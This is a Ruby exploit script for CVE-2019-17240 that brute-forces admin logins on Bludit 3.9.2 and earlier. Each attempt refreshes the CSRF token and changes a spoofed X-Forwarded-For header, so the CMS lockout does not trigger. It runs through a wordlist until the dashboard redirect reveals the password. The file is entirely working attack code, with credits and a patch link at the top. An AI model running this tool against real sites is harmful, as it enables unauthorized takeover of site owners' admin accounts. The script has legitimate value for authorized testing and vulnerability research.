#!/usr/bin/env ruby
## Title: Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass
## Author: noraj (Alexandre ZANNI)
## Author website: https://pwn.by/noraj/
## Date: 2020-08-16
## Vendor Homepage: https://www.bludit.com/
## Software Link: https://github.com/bludit/bludit/archive/3.9.2.tar.gz
## Version: <= 3.9.2
## Tested on: Bludit Version 3.9.2

# Vulnerability
## Discoverer: Rastating
## Discoverer website: https://rastating.github.io/
## CVE: CVE-2019-17240
## CVE URL: https://nvd.nist.gov/vuln/detail/CVE-2019-17240
## References: https://rastating.github.io/bludit-brute-force-mitigation-bypass/
## Patch: https://github.com/bludit/bludit/pull/1090

require 'httpclient'
require 'docopt'

# dirty workaround to remove this warning:
#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need "." at the beginning.
# see https://github.com/nahi/httpclient/issues/252
class WebAgent
  class Cookie < HTTP::Cookie
    def domain
      self.original_domain
    end
  end
end

def get_csrf(client, login_url)
  res = client.get(login_url)
  csrf_token = /input.+?name="tokenCSRF".+?value="(.+?)"/.match(res.body).captures[0]
end

def auth_ok?(res)
  HTTP::Status.redirect?(res.code) &&
    %r{/admin/dashboard}.match?(res.headers['Location'])
end

def bruteforce_auth(client, host, username, wordlist)
  login_url = host + '/admin/login'
  File.foreach(wordlist).with_index do |password, i|
    password = password.chomp
    csrf_token = get_csrf(client, login_url)
    headers = {
      'X-Forwarded-For' => "#{i}-#{password[..4]}",
    }
    data = {
      'tokenCSRF' => csrf_token,
      'username' => username,
      'password' => password,
    }
    puts "[*] Trying password: #{password}"
    auth_res = client.post(login_url, data, headers)
    if auth_ok?(auth_res)
      puts "\n[+] Password found: #{password}"
      break
    end
  end
end

doc = <<~DOCOPT
  Bludit <= 3.9.2 - Authentication Bruteforce Mitigation Bypass

  Usage:
    #{__FILE__} -r <url> -u <username> -w <path> [--debug]
    #{__FILE__} -H | --help

  Options:
    -r <url>, --root-url <url>            Root URL (base path) including HTTP scheme, port and root folder
    -u <username>, --user <username>      Username of the admin
    -w <path>, --wordlist <path>          Path to the wordlist file
    --debug                               Display arguments
    -H, --help                            Show this screen

  Examples:
    #{__FILE__} -r http://example.org -u admin -w myWordlist.txt
    #{__FILE__} -r https://example.org:8443/bludit -u john -w /usr/share/wordlists/password/rockyou.txt
DOCOPT

begin
  args = Docopt.docopt(doc)
  pp args if args['--debug']

  clnt = HTTPClient.new
  bruteforce_auth(clnt, args['--root-url'], args['--user'], args['--wordlist'])
rescue Docopt::Exit => e
  puts e.message
end